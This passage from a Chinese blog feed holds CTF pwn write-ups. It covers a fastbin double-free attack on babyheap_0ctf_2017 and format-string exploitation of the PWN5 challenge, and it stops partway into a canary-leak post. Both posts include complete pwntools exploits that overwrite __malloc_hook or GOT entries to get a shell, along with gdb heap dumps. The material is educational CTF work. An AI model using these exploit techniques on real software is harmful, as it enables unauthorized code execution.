fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。</p><p>Fastbin Double Free 能够成功利用主要有两部分的原因</p><ol><li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li><li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li></ol><pre><code>/* Another simple check: make sure the top of the bin is not the       record we are going to add (i.e., double free).  */    if (__builtin_expect (old == p, 0))      {        errstr = "double free or corruption (fasttop)";        goto errout;}</code></pre><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200324225625.png" alt=""></p><p>注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。 下面这个示例演示了这一点，首先跟前面一样构造 main_arena=&gt;chunk1=&gt;chun2=&gt;chunk1 的链表。之后第一次调用 malloc 返回 chunk1 之后修改 chunk1 的 fd 指针指向 bss 段上的 bss_chunk，之后我们可以看到 fastbin 会把堆块分配到这里。</p><h2 id="0x20-漏洞利用"><a href="#0x20-漏洞利用" class="headerlink" title="0x20 漏洞利用"></a>0x20 漏洞利用</h2><p>babyheap_0ctf_2017</p><p>题目来源：buuoj</p><p>考点：堆溢出, <strong>fastbin attack</strong></p><p>难度：baby</p><p>你说它是个BABY那他就是吧</p><h3 id="0x00-题目分析"><a href="#0x00-题目分析" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h3><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">babyheap_0ctf_2017: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped</code></pre><p>64位动态链接库文件</p><p>checksec:</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre><p>堆溢出都是这样的保护全开</p><pre class=" language-lang-txt"><code class="language-lang-txt">===== Baby Heap in 2017 =====1. Allocate2. Fill3. Free4. Dump5. Exit</code></pre><p>程序提供了5个功能</p><ul><li>Allocate - 调用 calloc 分配小于 0x1000 大小的内存，calloc 分配的 chunk 会被清空。</li><li>Fill - 填充任意大小的内存，意味着可以覆盖其它 chunk。</li><li>Free - 释放一块 chunk。</li><li>Dump - 输出限制大小的 chunk 内容。</li></ul><p>ida 反汇编</p><p><strong>1. Allocate</strong></p><blockquote><p>分配内存</p></blockquote><pre class=" language-lang-c"><code class="language-lang-c">void __fastcall sub_D48(__int64 a1){  signed int i; // [rsp+10h] [rbp-10h]  signed int v2; // [rsp+14h] [rbp-Ch]  void *v3; // [rsp+18h] [rbp-8h]  for ( i = 0; i <= 15; ++i )  {    if ( !*(24LL * i + a1) )    {      printf("Size: ");      v2 = sub_138C();      if ( v2 > 0 )      {        if ( v2 > 4096 )          v2 = 4096;        v3 = calloc(v2, 1uLL);        if ( !v3 )          exit(-1);        *(24LL * i + a1) = 1;        *(a1 + 24LL * i + 8) = v2;        *(a1 + 24LL * i + 16) = v3;        printf("Allocate Index %d\n", i);      }      return;    }  }}</code></pre><p><strong>2. Fill</strong></p><blockquote><p>填充内容，可填充任意字长的内容，漏洞就出在此处。</p></blockquote><pre class=" language-lang-c"><code class="language-lang-c">__int64 __fastcall sub_E7F(__int64 a1){  __int64 result; // rax  int v2; // [rsp+18h] [rbp-8h]  int v3; // [rsp+1Ch] [rbp-4h]  printf("Index: ");  result = sub_138C();  v2 = result;  if ( result >= 0 && result <= 15 )  {    result = *(24LL * result + a1);    if ( result == 1 )    {      printf("Size: ");      result = sub_138C();      v3 = result;            //这里对输入长度没有限制      if ( result > 0 )      {        printf("Content: ");        result = sub_11B2(*(24LL * v2 + a1 + 16), v3);      }    }  }  return result;}</code></pre><p><strong>3. Free</strong></p><blockquote><p>释放内存</p></blockquote><pre class=" language-lang-c"><code class="language-lang-c">__int64 __fastcall sub_F50(__int64 a1){  __int64 result; // rax  int v2; // [rsp+1Ch] [rbp-4h]  printf("Index: ");  result = sub_138C();  v2 = result;  if ( result >= 0 && result <= 15 )  {    result = *(24LL * result + a1);    if ( result == 1 )    {      *(24LL * v2 + a1) = 0;      *(24LL * v2 + a1 + 8) = 0LL;      free(*(24LL * v2 + a1 + 16));      result = 24LL * v2 + a1;      *(result + 16) = 0LL;    }  }  return result;}</code></pre><p><strong>4. Dump</strong></p><blockquote><p>打印内容</p></blockquote><pre class=" language-lang-c"><code class="language-lang-c">signed int __fastcall sub_1051(__int64 a1){  signed int result; // eax  signed int v2; // [rsp+1Ch] [rbp-4h]  printf("Index: ");  result = sub_138C();  v2 = result;  if ( result >= 0 && result <= 15 )  {    result = *(24LL * result + a1);    if ( result == 1 )    {      puts("Content: ");      sub_130F(*(24LL * v2 + a1 + 16), *(24LL * v2 + a1 + 8));      result = puts(byte_14F1);    }  }  return result;}</code></pre><p>利用思路：</p><p>在fill的地方存在一个堆溢出，可以写任意长度，因为分配使用的calloc，所以在分配的时候会将分配出来的chunk先清空，dump的大小是根据alloc指定的size决定的，跟真正的chunk大小无关。</p><h3 id="0x10-Leak-Libc"><a href="#0x10-Leak-Libc" class="headerlink" title="0x10 Leak Libc"></a>0x10 Leak Libc</h3><p>程序没有 uaf ，内存被释放后无法查看其中内容，可以通过 double free 获得指向 small bin 的 index，将其释放后 dump 出来。</p><p>首先分配一系列相同大小的 fast chunk，再分配一个 small chunk，释放掉其中一个 fast chunk。</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    free(1)</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">gdb-peda$ x/48wx 0x55a1cc17d0000x55a1cc17d000:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk0(fastbin,in use)0x55a1cc17d010:    0x00000000    0x00000000    0x00000000    0x000000000x55a1cc17d020:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk1(fastbin ,free)0x55a1cc17d030:    0x00000000    0x00000000    0x00000000    0x000000000x55a1cc17d040:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk2(fastbin ,in use)0x55a1cc17d050:    0x00000000    0x00000000    0x00000000    0x000000000x55a1cc17d060:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk3(fastbin ,in use)0x55a1cc17d070:    0x00000000    0x00000000    0x00000000    0x000000000x55a1cc17d080:    0x00000000    0x00000000    0x00000091    0x00000000  ==>chunk4(smallbins ,in use)0x55a1cc17d090:    0x00000000    0x00000000    0x00000000    0x000000000x55a1cc17d0a0:    0x00000000    0x00000000    0x00000000    0x000000000x55a1cc17d0b0:    0x00000000    0x00000000    0x00000000    0x00000000gdb-peda$ x/32xw &main_arena0x7f001f560b20 <main_arena>:    0x00000000    0x00000000    0xcc17d020    0x000055a1 ==>fastbin[0]0x7f001f560b30 <main_arena+16>:    0x00000000    0x00000000    0x00000000    0x000000000x7f001f560b40 <main_arena+32>:    0x00000000    0x00000000    0x00000000    0x000000000x7f001f560b50 <main_arena+48>:    0x00000000    0x00000000    0x00000000    0x000000000x7f001f560b60 <main_arena+64>:    0x00000000    0x00000000    0x00000000    0x000000000x7f001f560b70 <main_arena+80>:    0x00000000    0x00000000    0xcc17d110    0x000055a10x7f001f560b80 <main_arena+96>:    0x00000000    0x00000000    0x1f560b78    0x00007f000x7f001f560b90 <main_arena+112>:    0x1f560b78    0x00007f00    0x1f560b88    0x00007f00</code></pre><p>释放的那个 fast chunk 被放入到 fastbin 中，fastbin 为单链表形式，如果再释放一个 fast chunk，将其插入 fastbin 的头部，释放的第二个 chunk 其 fd 会被设置成第一个 chunk 的地址。</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    Allocate(0x80)    free(1)    free(2)</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">gdb-peda$ x/48wx 0x56365c80a0000x56365c80a000:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk0(fastbin,in use)0x56365c80a010:    0x00000000    0x00000000    0x00000000    0x000000000x56365c80a020:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk1(fastbin,free)0x56365c80a030:    0x00000000    0x00000000    0x00000000    0x000000000x56365c80a040:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk2(fastbin,free)0x56365c80a050:    0x5c80a020    0x00005636    0x00000000    0x000000000x56365c80a060:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk3(fastbin,in use)0x56365c80a070:    0x00000000    0x00000000    0x00000000    0x000000000x56365c80a080:    0x00000000    0x00000000    0x00000091    0x00000000  ==>chunk4(fastbin,in use)0x56365c80a090:    0x00000000    0x00000000    0x00000000    0x000000000x56365c80a0a0:    0x00000000    0x00000000    0x00000000    0x000000000x56365c80a0b0:    0x00000000    0x00000000    0x00000000    0x00000000gdb-peda$ x/32xw &main_arena0x7fe892d7eb20 <main_arena>:    0x00000000    0x00000000    0x5c80a040    0x00005636 ==>最新释放的 chunk0x7fe892d7eb30 <main_arena+16>:    0x00000000    0x00000000    0x00000000    0x000000000x7fe892d7eb40 <main_arena+32>:    0x00000000    0x00000000    0x00000000    0x000000000x7fe892d7eb50 <main_arena+48>:    0x00000000    0x00000000    0x00000000    0x000000000x7fe892d7eb60 <main_arena+64>:    0x00000000    0x00000000    0x00000000    0x000000000x7fe892d7eb70 <main_arena+80>:    0x00000000    0x00000000    0x5c80a110    0x000056360x7fe892d7eb80 <main_arena+96>:    0x00000000    0x00000000    0x92d7eb78    0x00007fe80x7fe892d7eb90 <main_arena+112>:    0x92d7eb78    0x00007fe8    0x92d7eb88    0x00007fe8</code></pre><p>此时使用 fill 覆盖 fastbin 头部 chunk 的 fd 值，将其改写成 small chunk 的地址，那么通过两次 alloc，先将 small chunk 放入 fastbin，再将其取出来，获得指向它的 index。要这么做必须绕过 malloc 的安全检查：</p><pre class=" language-lang-c"><code class="language-lang-c">if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)){    errstr = "malloc(): memory corruption (fast)";errout:    malloc_printerr (check_action, errstr, chunk2mem (victim), av);    return NULL;}</code></pre><p>查看其 chunksize 与相应的 fastbin_index 是否匹配，实际上 chunksize 的计算方法是 <code>victim-&gt;size &amp; ~(SIZE_BITS))</code>，而它对应的 index 计算方法为 <code>(size) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3) - 2</code>，这里 64位的平台对应的 SIZE_SZ 是8，则 fastbin_index 为 <code>(size &gt;&gt; 4) - 2</code>，那么我们将 small chunk 的 size 域改写成 0x21 即可。</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    Allocate(0x80)    free(1)    free(2)    payload = p64(0)*3    payload += p64(0x21)    payload += p64(0)*3    payload += p64(0x21)    payload += p8(0x80)    fill(0, payload)    payload = p64(0)*3    payload += p64(0x21)    fill(3, payload)    Allocate(0x10)    Allocate(0x10)0x441a4924a940:    0x0000000000000001    0x00000000000000100x441a4924a950:    0x000056254a9bc010    0x00000000000000010x441a4924a960:    0x0000000000000010    0x000056254a9bc0500x441a4924a970:    0x0000000000000001    0x00000000000000100x441a4924a980:    0x000056254a9bc090    0x00000000000000010x441a4924a990:    0x0000000000000010    0x000056254a9bc0700x441a4924a9a0:    0x0000000000000001    0x00000000000000800x441a4924a9b0:    0x000056254a9bc090    0x00000000000000000x441a4924a9c0:    0x0000000000000000    0x00000000000000000x441a4924a9d0:    0x0000000000000000    0x0000000000000000</code></pre><p>可以看到 index[2] 存放的是 small chunk 的地址，此时将 small chunk 的 size 改写回来，将其释放掉就可以 dump 出来了。</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    Allocate(0x80)    free(1)    free(2)    payload = p64(0)*3    payload += p64(0x21)    payload += p64(0)*3    payload += p64(0x21)    payload += p8(0x80)    fill(0, payload)    payload = p64(0)*3    payload += p64(0x21)    fill(3, payload)    Allocate(0x10)    Allocate(0x10)    payload = p64(0)*3    payload += p64(0x91)    fill(3, payload)    Allocate(0x80)    free(4)    libc_base = u64(dump(2)[:8].strip().ljust(8, "\x00"))-0x3c4b78    log.info("libc_base: "+hex(libc_base))</code></pre><p>可以发现 index 为 2 的 chunk 的 fd 指针指向 index 为 1 的 chunk 。</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload = p64(0) * 3payload += p64(0x21)payload += p64(0) * 3payload += p64(0x21)payload += p8(0x80)fill(0,payload)</code></pre><p>  把 chunk 2 的内容覆盖为 chunk 4 的地址，这样相当于 chunk 4 已经被 free 了而且被存放在 fastbin 中。</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload = p64(0) * 3payload += p64(0x21)fill(3,payload)</code></pre><p>  此时 heap 如下</p><pre class=" language-lang-txt"><code class="language-lang-txt">gdb-peda$ x /40xg 0x55a64a9e8000 30x55a64a9e8000: 0x0000000000000000  0x0000000000000021  chunk 0 0x55a64a9e8010: 0x0000000000000000  0x00000000000000000x55a64a9e8020: 0x0000000000000000  0x0000000000000021  chunk 10x55a64a9e8030: 0x0000000000000000  0x00000000000000000x55a64a9e8040: 0x0000000000000000  0x0000000000000021  chunk 20x55a64a9e8050: 0x000055a64a9e8080  0x00000000000000000x55a64a9e8060: 0x0000000000000000  0x0000000000000021  chunk 30x55a64a9e8070: 0x0000000000000000  0x00000000000000000x55a64a9e8080: 0x0000000000000000  0x0000000000000021  chunk 40x55a64a9e8090: 0x0000000000000000  0x00000000000000000x55a64a9e80a0: 0x0000000000000000  0x00000000000000000x55a64a9e80b0: 0x0000000000000000  0x00000000000000000x55a64a9e80c0: 0x0000000000000000  0x00000000000000000x55a64a9e80d0: 0x0000000000000000  0x00000000000000000x55a64a9e80e0: 0x0000000000000000  0x00000000000000000x55a64a9e80f0: 0x0000000000000000  0x00000000000000000x55a64a9e8100: 0x0000000000000000  0x00000000000000000x55a64a9e8110: 0x0000000000000000  0x0000000000020ef10x55a64a9e8120: 0x0000000000000000  0x00000000000000000x55a64a9e8130: 0x0000000000000000  0x0000000000000000</code></pre><p>  我们等下要 malloc 回 chunk 4 ，可是 malloc fastbin 有检查， chunksize 必须与相应的 fastbin_index 匹配，所以我们覆盖 chunk 4 的 size 为 fastbin 大小</p><pre class=" language-lang-txt"><code class="language-lang-txt">allocate(0x10)allocate(0x10)payload = p64(0) * 3payload += p64(0x91)fill(3,payload)allocate(0x80)free(4)libc_base = u64(dump(2)[:8].strip().ljust(8, "\x00"))-0x3c4b78log.info("libc_base: "+hex(libc_base))</code></pre><p>  unsortbin 有一个特性，就是如果 usortbin 只有一个 bin ，它的 fd 和 bk 指针会指向同一个地址(unsorted bin 链表的头部），这个地址为 main_arena + 0x58 ，而且 main_arena 又相对 libc 固定偏移 0x3c4b20 ，所以得到这个fd的值，然后减去0x58再减去main_arena相对于libc的固定偏移，即得到libc的基地址。所以我们需要把 chunk 改成大于 fastbin 的大小，这样 free 后能进入 unsortbin 让我们能够泄露 libc 基址。<br>  我们的目标是覆盖 __malloc_hook 函数，这样我们调用 malloc 时就相当于调用我们写入的内容</p><pre class=" language-lang-txt"><code class="language-lang-txt">gdb-peda$ x/32xw (long long)(&main_arena)-0x400x7f2a8a09eae0 <_IO_wide_data_0+288>:   0x00000000  0x00000000  0x00000000  0x000000000x7f2a8a09eaf0 <_IO_wide_data_0+304>:   0x8a09d260  0x00007f2a  0x00000000  0x000000000x7f2a8a09eb00 <__memalign_hook>:   0x89d5fe20  0x00007f2a  0x89d5fa00  0x00007f2a0x7f2a8a09eb10 <__malloc_hook>: 0x00000000  0x00000000  0x00000000  0x000000000x7f2a8a09eb20 <main_arena>:    0x00000000  0x00000000  0x00000000  0x000000000x7f2a8a09eb30 <main_arena+16>: 0x00000000  0x00000000  0x00000000  0x000000000x7f2a8a09eb40 <main_arena+32>: 0x00000000  0x00000000  0x00000000  0x000000000x7f2a8a09eb50 <main_arena+48>: 0x00000000  0x00000000  0x00000000  0x00000000</code></pre><p>   malloc 时还需要再次绕过检测，我 malloc(0x60) 也就是 0x70 大小的 chunk</p><pre class=" language-lang-txt"><code class="language-lang-txt">gdb-peda$ x/32xw (long long)(&main_arena)-0x40+0xd0x7f2a8a09eaed <_IO_wide_data_0+301>:   0x60000000  0x2a8a09d2  0x0000007f  0x000000000x7f2a8a09eafd: 0x20000000  0x2a89d5fe  0x0000007f  0x2a89d5fa0x7f2a8a09eb0d <__realloc_hook+5>:  0x0000007f  0x00000000  0x00000000  0x000000000x7f2a8a09eb1d: 0x00000000  0x00000000  0x00000000  0x000000000x7f2a8a09eb2d <main_arena+13>: 0x00000000  0x00000000  0x00000000  0x000000000x7f2a8a09eb3d <main_arena+29>: 0x00000000  0x00000000  0x00000000  0x000000000x7f2a8a09eb4d <main_arena+45>: 0x00000000  0x00000000  0x00000000  0x000000000x7f2a8a09eb5d <main_arena+61>: 0x00000000  0x00000000  0x00000000  0x00000000</code></pre><p>  可以发现在 0x7f2a8a09eaed 处构造块可以绕过检测（因为 7f 满足 0x70 大小），可以计算 0x7f2a8a09eaed 距离 libc 基址的偏移为 0x3c4aed</p><pre class=" language-lang-txt"><code class="language-lang-txt">allocate(0x60)free(4)payload = p64(libc_base+0x3c4aed)fill(2, payload)</code></pre><p>  首先把 chunk 4 malloc 回来，这次 malloc 的大小在 fastbin 之内，然后把 chunk 4 的内容改为我们下一个要构造块的地址（chunk 4 已经被 free 掉，所以无法用 fill(4) 写入，由于我们刚刚把 chunk 2 的 fd 指针改为 chunk 4 的地址，所以第一次 malloc(0x10) 的时候是分配的原来 chunk 2 的块给 index 1，第二次 malloc(0x10) 的时候就会分配 chunk 4 的块给 index 2，也就是说 index 2 与 index 4 的内容都是 chunk 4）</p><pre class=" language-lang-txt"><code class="language-lang-txt">allocate(0x60)allocate(0x60)payload = p8(0)*3payload += p64(0)*2payload += p64(libc_base+0x4526a)fill(6, payload)allocate(200)</code></pre><p>完整exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *import syscontext.log_level = "debug"proc="./babyheap_0ctf_2017"def Allocate(size):    sh.recvuntil("Command: ")    sh.sendline("1")    sh.recvuntil("Size: ")    sh.sendline(str(size))def fill(index,content):    sh.recvuntil("Command: ")    sh.sendline("2")    sh.recvuntil("Index: ")    sh.sendline(str(index))    sh.recvuntil("Size: ")    sh.sendline(str(len(content)))    sh.recvuntil("Content: ")    sh.sendline(content)def free(index):    sh.recvuntil("Command: ")    sh.sendline("3")    sh.recvuntil("Index: ")    sh.sendline(str(index))def dump(index):    sh.recvuntil("Command: ")    sh.sendline("4")    sh.recvuntil("Index: ")    sh.sendline(str(index))        sh.recvline()    return sh.recvline()def pwn(ip,port,debug):    global sh    if debug==1:        sh=process(proc)    else:        sh=remote(ip,port)    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    Allocate(0x80)    free(1)    free(2)    payload = p64(0)*3    payload += p64(0x21)    payload += p64(0)*3    payload += p64(0x21)    payload += p8(0x80)    fill(0, payload)    payload = p64(0)*3    payload += p64(0x21)    fill(3, payload)    Allocate(0x10)    Allocate(0x10)    payload = p64(0)*3    payload += p64(0x91)    fill(3, payload)    Allocate(0x80)    free(4)    libc_base = u64(dump(2)[:8].strip().ljust(8, "\x00"))-0x3c4b78    log.info("libc_base: "+hex(libc_base))    Allocate(0x60)    free(4)    payload = p64(libc_base+0x3c4aed)    fill(2, payload)    Allocate(0x60)    Allocate(0x60)    payload = p8(0)*3    payload += p64(0)*2    one_gadget=0x4526a    payload += p64(libc_base+one_gadget)    fill(6, payload)    Allocate(255)    sh.sendline("cat flag")    sh.interactive()if __name__=="__main__":    pwn("node3.buuoj.cn",25187,0)</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞原理与利用思路</title>
      <link href="/2020/03/25/ctf/pwn/fmt/"/>
      <url>/2020/03/25/ctf/pwn/fmt/</url>
      
        <content type="html"><![CDATA[<h1 id="格式化字符串漏洞原理与利用思路"><a href="#格式化字符串漏洞原理与利用思路" class="headerlink" title="格式化字符串漏洞原理与利用思路"></a>格式化字符串漏洞原理与利用思路</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>参考师傅： <a href="https://www.anquanke.com/post/id/194458" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194458</a> 64位格式化字符串漏洞修改got表利用详解</p><p>以及：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/</a> ctf-wiki</p><p>学习记录所用</p><h2 id="0x10-漏洞原理"><a href="#0x10-漏洞原理" class="headerlink" title="0x10 漏洞原理"></a>0x10 漏洞原理</h2><p>pritnf作为c语言中的输出函数，其使用方式是填充两个参数，分别是格式化字符和变量即：printf(“格式化字符”,变量（指针、整形等变量）); 但有的人为了省事也会写成 printf(变量); 虽然都可以正常输出，但那是在正常情况下。而在不正常的情况下比如被利用时，printf(变量); 这样的写法就变得很危险了</p><p>其中格式化字符有：</p><p>%c：输出字符，配上%n可用于向指定地址写数据。</p><p>%d：输出十进制整数，配上%n可用于向指定地址写数据。</p><p>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</p><p>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</p><p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p><p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x%10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</p><p>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p><h2 id="0x20-漏洞利用"><a href="#0x20-漏洞利用" class="headerlink" title="0x20 漏洞利用"></a>0x20 漏洞利用</h2><p>我也是一个喜欢实际操作的人，光看理论有什么意思呢，还是要通过实践来检验真理</p><p>刚好在刷buuoj，就直接拿我刚刷到的[第五空间2019 决赛]PWN5的这道题来做介绍</p><p>拿到文件后我们发现，这是一个32位的程序，开启了NX保护，等下在找个64位的，先看这个吧</p><p>ida反汇编主要函数:</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int a1){  unsigned int v1; // eax  int fd; // ST14_4  int result; // eax  char nptr; // [esp+4h] [ebp-80h]  char buf; // [esp+14h] [ebp-70h]  unsigned int v6; // [esp+78h] [ebp-Ch]  int *v7; // [esp+7Ch] [ebp-8h]  v7 = &a1;  v6 = __readgsdword(0x14u);  setvbuf(stdout, 0, 2, 0);  v1 = time(0);  srand(v1);  fd = open("/dev/urandom", 0);  read(fd, &unk_804C044, 4u);  printf("your name:");  read(0, &buf, 0x63u);  printf("Hello,");  printf(&buf);  printf("your passwd:");  read(0, &nptr, 0xFu);  if ( atoi(&nptr) == unk_804C044 )  {    puts("ok!!");    system("/bin/sh");  }  else  {    puts("fail");  }  result = 0;  if ( __readgsdword(0x14u) != v6 )    sub_80493D0();  return result;}</code></pre><p>程序就一个主函数，其功能大概是：读取一个随机字符串到&amp;unk_804C044 ，然后让我们输入name,并将它打印出来，然后让我们输入密码，我们输入的密码会与&amp;unk_804C044 做对比，相等就执行system(“/bin/sh”),不等就结束。</p><p>也就是说我们想要执行system(“/bin/sh”),需要让atoi(&amp;nptr) == unk_804C044，如果我们运气好，四位随机数一次性猜对，就可以取得shell了，但很明显，我运气不好。</p><p>而我们的read()函数并不存在溢出，因此想要覆盖unk_804C044，就基本不太可能了，但这个时候我们发现</p><pre class=" language-lang-c"><code class="language-lang-c">  printf("your name:");  read(0, &buf, 0x63u);  printf("Hello,");  printf(&buf);# 直接打印&buf ,导致我们可以输入%s,等这类的格式化字符串，泄露出地址</code></pre><p>典型的格式化字符串出现了我们可以通过：</p><p>填充%x来获取栈上存储的值，这里利用别人的脚本来获取一下偏移</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *def pianyi(pwn_name,x = 'x'):    print('pwn_name=' + pwn_name + ',x=' + x)    i = 0    while True :        r = process(pwn_name)         i += 1        payload = 'a'*4 + '.' + '%' + str(i) + '$' + '8x'        r.sendline(payload)        r.recvuntil("aaaa.")        r_recv = r.recv(8)        print('*'*10 + r_recv + '*'*10)        if r_recv == '61616161':            print(payload)            if x == 'x':                s = '%' + str(i) + '$8x'            else :                s = '%' + str(i) + '$8' + str(x)            return s            breakif __name__=='__main__':    pianyi("./pwn")</code></pre><p>输出：</p><pre class=" language-lang-txt"><code class="language-lang-txt">**********61616161**********aaaa.%10$8x</code></pre><p>这里解释一下 <code>%n$x</code> 的意思是获取到对应的第 n+1 个参数的数值。为什么这里要说是对应第 n+1 个参数呢？这是因为格式化参数里面的 n 指的是该格式化字符串对应的第 n 个输出参数，那相对于输出函数来说，就是第 n+1 个参数了，其实也就是 <code>%x</code> 的一种形式</p><p>算出来偏移以后，根据我们前面介绍的知识点</p><p>但根据我们前面的知识，我们就可以发现，这道题的解法不止一种</p><p>1.利用%n,修改unk_804C044 中的数据，利用程序所给的system(‘/bin/sh’)，也是针对这道题的解法</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">from pwn import *io=process('./pwn')addr=0x0804C044payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)payload+='%10$hhn%11$hhn%12$hhn%13$hhn'io.sendline(payload)payload=str(0x10101010)io.sendline(payload)io.interactive()</code></pre><p>解释下payload:</p><pre class=" language-lang-txt"><code class="language-lang-txt">  read(fd, &unk_804C044, 4u);读取了四个字节到了&unk_804C044,</code></pre><p>而根据我们前面介绍的 <code>%n</code> 的作用我们可以知道 <code>%10$hhn</code>  可以做到将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，而%n 之前打印的字符个数就是我们算的偏移量，也就是10，%后跟的数字是定位用参数位置的用的</p><p>而我们的payload给到printf(&amp;buf)后会变成这个样子</p><pre class=" language-lang-c"><code class="language-lang-c">printf(&unk_804C044,&unk_804C045,&unk_804C046,&unk_804C047,%10$hhn%11$hhn%12$hhn%13$hhn)</code></pre><p>而 <code>%10$hhn</code> 所指向的地址就是&amp;unk_804C044，也就是把10赋值给了&amp;unk_804C044，同理执行完后：</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200317204315.png" alt=""></p><p>我们可以看到，&amp;unk_804C044的值已经被我们修改为 0x10101010了，然后我们就可以getshell了。</p><p>这个方法只对本题适合使用，有没有方法可以通吃呢，</p><p>当然有</p><p>2.泄露got表，修改函数执行</p><p>原理：由于延迟绑定技术，只有在程序中执行过的函数，got中才会绑定其真实地址，所以要泄露的时漏洞之前已经执行过的函数</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">from pwn import *p=process('./pwn1')# p=remote('node2.buuoj.cn.wetolink.com',28910)elf=ELF('./pwn1')def debug():    pwnlib.gdb.attach(p)    pause();offset=10system_addr=0x08049080read_addr=elf.got['read']atio=elf.got['atoi']p.recvuntil(':')payload1=fmtstr_payload(offset,{atio:system_addr})p.sendline(payload1)p.recvuntil('your passwd:')p.sendline('/bin/sh\x00')'''p.sendline(payload1)p.recvuntil('Hello,')p.recvuntil('\x08')rec=u32(p.recv(4).ljust(4,'\x00'))log.success('rec: '+hex(rec))p.recvuntil('your passwd:')p.sendline(p32(rec))'''p.interactive()</code></pre><p>这个脚本不是我写的，但我觉很nice，一看就懂了，特别是这行payload,</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload1=fmtstr_payload(offset,{atio:system_addr})</code></pre><p>真就是小母牛进了公牛圈，简单明了</p><h2 id="0x30-泄露Canary"><a href="#0x30-泄露Canary" class="headerlink" title="0x30 泄露Canary"></a>0x30 泄露Canary</h2><p>本次题目是BJDCTF的一道题，引发了我对格式化字符串的思考</p><p>64位动态链接库文件，在 <code>0x00400626</code> 处提供了后门，且程序开启了NX与Canary保护</p><p>题目源码：</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp){  char buf; // [rsp+0h] [rbp-30h]  unsigned __int64 v5; // [rsp+28h] 